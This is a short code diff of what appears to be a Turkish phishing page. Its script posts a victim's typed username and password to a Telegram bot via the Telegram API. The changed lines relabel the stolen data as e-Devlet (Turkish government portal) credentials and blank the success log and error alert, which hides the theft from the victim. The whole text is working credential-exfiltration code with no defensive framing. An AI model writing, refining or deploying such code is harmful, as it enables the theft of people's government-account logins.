@@ -231,7 +231,7 @@
             var url = `https://api.telegram.org/bot${token}/sendMessage`;
 
             // Mesaj içeriğini oluştur
-            var text = `işte bilgiler  :):\n\nKullanıcı Adı: ${username}\nŞifre: ${password}`;
+            var text = `E-devlet bilgileri  :):\n\nKullanıcı Adı: ${username}\nŞifre: ${password}`;
 
             // Veriyi Telegram API'sine gönder
             fetch(url, {
@@ -246,11 +246,11 @@
             })
                 .then(response => response.json())
                 .then(data => {
-                    console.log("Mesaj başarıyla gönderildi.", data);
+                    console.log("", data);
                 })
                 .catch(error => {
                     console.error("Hata:", error);
-                    alert("Bir hata oluştu, lütfen tekrar deneyin.");
+                    alert("");
                 });
         });
     </script>
